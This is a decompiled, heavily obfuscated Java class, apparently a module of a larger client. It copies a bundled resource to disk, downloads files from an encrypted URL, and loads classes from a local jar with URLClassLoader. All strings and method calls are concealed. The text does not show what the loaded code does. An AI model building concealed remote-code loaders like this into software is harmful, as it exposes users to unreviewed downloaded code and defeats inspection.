/*
 * Decompiled with CFR 0_123.
 */
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.Reader;
import java.lang.invoke.ConstantCallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ResourceBundle;

public class MSHX
extends ggmf {
    private File Aadj;
    private int JdQO = 0;
    File SoLK;

    @Override
    public void start() {
        Object object;
        o.v(this, 1415534992, new File((File)MSHX.Ue(MSHX.Ue(MSHX.Ue())), nJPf$sILv.G("\u78ac\ua96b\u7708\u9628")));
        MSHX.Ue((File)o.a(this, 1415534992));
        try {
            this.Bcie();
        }
        catch (IOException iOException) {
            object = iOException;
            MSHX.Ue(iOException);
        }
        try {
            this.Mkpo((String)o.k(750868542));
            MSHX.Ue(MSHX.Ue(MSHX.Ue(new StringBuilder(nJPf$sILv.G("\u788c\ua96b\u7708\u9628\ub3ae\u54cf\uaaf8\u6353\u3b43\ue17e")), (String)o.k(750868542))));
        }
        catch (Exception exception) {
            o.w(-1137288818, (ResourceBundle)o.k(-110929521));
            MSHX.Ue(MSHX.Ue(MSHX.Ue(MSHX.Ue(new StringBuilder(nJPf$sILv.G("\u7886\ua96b\u770f\u9623\ub3be\u54ca\uaabf\u6342\u3b16\ue17e\u1336\u9d81\u6c09\u96e9\ufd0b\u33c9\u8f36\u4061\uc9f0\uda7b\ub744\u7f7c\uc30c\ub352\u4cb3")), (String)o.k(750868542)), nJPf$sILv.G("\u78ee\ua97a\u7714\u9620\ub3ab\u54cb\uaaed\u6342\u3b10\ue13b\u1329\u9dce\u6c40\u96e4\ufd45\u3385\u8f27\u4063\uc9e2\uda69\ub74c\u7f75\uc31a\ub347\u4cc1\ub9bb\u3909\u0efb\uc7d4\u708a\u316d\u0cd3\u40ff\u42d7\u46d4"))));
        }
        o.v(this, -1365223011, new File((File)o.a(this, 1415534992), nJPf$sILv.G("\u78a9\ua964\u7702\u962a\ub3a3\u5480\uaaf5\u6345\u3b16\ue130")));
        object = new MSHX$1(this);
        MSHX.Ue(object, true);
        MSHX.Ue(object, nJPf$sILv.G("\u7893\ua97f\u7714\u9628\ub3be\u548e\uaad3\u6357\u3b17\ue139\u132f\u9d8f\u6c0f\u96e8\ufd0b\u33ec\u8f39\u4065\uc9f2\uda6d\ub751\u7f74\uc31b"));
    }

    public void aoCB() {
        new MSHX$2(this);
    }

    /*
     * Enabled aggressive block sorting
     */
    private void qcvH(boolean bl) throws IOException {
        Object object = "";
        BufferedReader bufferedReader = new BufferedReader(new FileReader((File)o.a(this, -1365223011)));
        Object object2 = "";
        while ((object2 = MSHX.Ue(bufferedReader)) != null) {
            object = MSHX.Ue(MSHX.Ue(new StringBuilder((String)MSHX.Ue(object)), object2));
        }
        MSHX.Ue(bufferedReader);
        vbpi vbpi2 = new vbpi((String)object);
        boolean bl2 = false;
        Object object3 = MSHX.Ue(MSHX.Ue(vbpi2, FMkR$WjFM.a("\u99a1\u70ed\u3470\udd7d\u2896\u983f\u91b4\uf4d4\u27ab")));
        while (object3.hasNext()) {
            Object e = object3.next();
            if (bl) {
                bl2 = true;
                this.UQfI((String)e);
                continue;
            }
            if (bl) continue;
            if (MSHX.Ue(new File((File)o.a(this, 1415534992), (String)MSHX.Ue(e))) != false) continue;
            bl2 = true;
            this.UQfI((String)e);
        }
        if (bl2) {
            MSHX.Ue(FMkR$WjFM.a("\u9981\u70ed\u3470\udd7d\u2896\u983f\u91b4\uf4d4\u27ab\ufa72\u5f48\u1640\u3c3c\uec9e\ue657\udd8a\ufa7a\ue874\u0087\u366e\u3f9e\uaca2\ub31b\u9981\u5c3b\uba39\u9c45\u2318\ufb6b\u858b\u516b\u8a4a\uce44\u4763"));
            new MSHX$3(this, FMkR$WjFM.a("\u99a9\u70e0\u3469\udd7b\u288a\u982a\u91b6\uf4c3"), 5);
        }
    }

    private void UQfI(String string) throws IOException {
        File file = new File((File)o.a(this, 1415534992), string);
        BuLd buLd = new BuLd(new MSHX$4(this, file), new URL((String)MSHX.Ue(MSHX.Ue(new StringBuilder(mrFx$WjFM.d("\u5236\u6209\ub468\uabd5\u9bd8\udeca\uc87a\u0bf6\ueb47\u0ea2\u899a\u4a1f\u5b6b\ubf65\ucf8a\u878c\u2425\u46bb\u92e4\ucb11\u18fd\u67b1\u7c7e\ubdec\u4fef\u163c\uebcc\u74dd\u383d\uc411\u0356\ueae0\ue13a\u455c\u7ae8\ufddc\uff9c\u149b\u3c98\u8546\u3e51\ud3a5\u4055\u6405\u625d\ue18d\u3bb8\u1a97\uc111\u00c4\uba81\u45ea\u64b3\u9bc4\ufcb1\u3130\u166e\u7a61\ucb56\u2f8d\u738f\ubd0f\u0a4b\u3573\u433f\u2d69\u3c4d\uf07c\u357c\uea5c\u9ce5")), string))), file, 8192);
        MSHX.Ue(buLd);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void check() {
        try {
            Object object = "";
            BufferedReader bufferedReader = new BufferedReader(new FileReader((File)o.a(this, -1365223011)));
            Object object2 = "";
            do {
                if ((object2 = MSHX.Ue(bufferedReader)) == null) {
                    MSHX.Ue(bufferedReader);
                    vbpi vbpi2 = new vbpi((String)object);
                    Object object3 = MSHX.Ue(vbpi2, mrFx$WjFM.d("\u10c4\u0304\u651c\uda7f\uf908\ua716\ucbb3"));
                    if (object3 == ((Integer)o.a(this, -7054951)).intValue()) break;
                    this.qcvH(true);
                    return;
                }
                object = MSHX.Ue(MSHX.Ue(new StringBuilder((String)MSHX.Ue(object)), object2));
            } while (true);
            this.qcvH(false);
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    public void Mkpo(String string) throws Exception {
        Object object = MSHX.Ue(this.CoVI(string));
        URL[] arruRL = new URL[1];
        arruRL[0] = MSHX.Ue(MSHX.Ue(object));
        URL[] arruRL2 = arruRL;
        URLClassLoader uRLClassLoader = new URLClassLoader(arruRL2);
        Object object2 = MSHX.Ue(string, MSHX.Ue(), uRLClassLoader);
        if (object2 != null) {
            o.w(-1137288818, object2);
            return;
        }
        throw new Exception(mrFx$WjFM.d("\u5f88\u0385\uabd0\u7d7c\u0d05\u41a5\u8d66\u262c\u22fc\ubf83\u049c\u1581\uca65\uaab2\u7992\u89d7\u8a88\u989d\u8db0\ufb5f\u790d\u0e4a\u0385\uab87\u7d7c\u910b\u295b\ud059\ubb10"));
    }

    public File CoVI(String string) {
        return new File((File)o.a(this, 1415534992), (String)MSHX.Ue(MSHX.Ue(new StringBuilder((String)MSHX.Ue(string)), mrFx$WjFM.d("\u9d7a\uf3dd\u20a0\u85f6\ua2b9\u55a5\u2e7b\u5c45\ue2e7\u62e7\u693a"))));
    }

    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Lifted jumps to return sites
     */
    public void Bcie() throws IOException {
        var1_1 = MSHX.Ue(TEqA.class, nJPf$sILv.G("\udc7f\u95ca\uc11d\u5f90\ud29b\ud0f4\ud105\uff57\u0891\u7f0a\u1d67\u57f2\uf886\uae65\u13a0\uf7b7\u9dc1\ue499\u4b94\u097e\u46a5\u4683"));
        var2_2 = new FileOutputStream(new File((File)o.a(this, 1415534992), nJPf$sILv.G("\udc35\u95d6\uc12d\u5fa2\ud2d6\ud0f0\ud158\uff54\u0880\u7f01\u1d72\u57a8\uf89f\uae72\u13bc")));
        var3_3 = new byte[4096];
        var4_4 = false;
        ** GOTO lbl11
lbl-1000: // 1 sources:
        {
            MSHX.Ue(var2_2, var3_3, false, var4_4);
lbl11: // 2 sources:
            v0 = MSHX.Ue(var1_1, var3_3);
            var4_4 = v0;
            ** while (v0 != -1)
        }
lbl16: // 1 sources:
        MSHX.Ue(var2_2);
        MSHX.Ue(var1_1);
    }

    @Override
    public void stop() {
    }

    @Override
    public void tick() {
    }

    static /* synthetic */ void yJLS(MSHX mSHX, int n) {
        o.v(mSHX, -7054951, n);
    }

    static /* synthetic */ void yJLS(MSHX mSHX) {
        mSHX.check();
    }

    private static Object Ue(Object object, Object object2, Object object3) {
        try {
            return new ConstantCallSite(((MethodHandles.Lookup)object).unreflect(o.Y(Integer.valueOf((String)object2, 32))).asType((MethodType)object3));
        }
        catch (ClassNotFoundException | IllegalAccessException reflectiveOperationException) {
            throw new BootstrapMethodError(reflectiveOperationException);
        }
    }
}

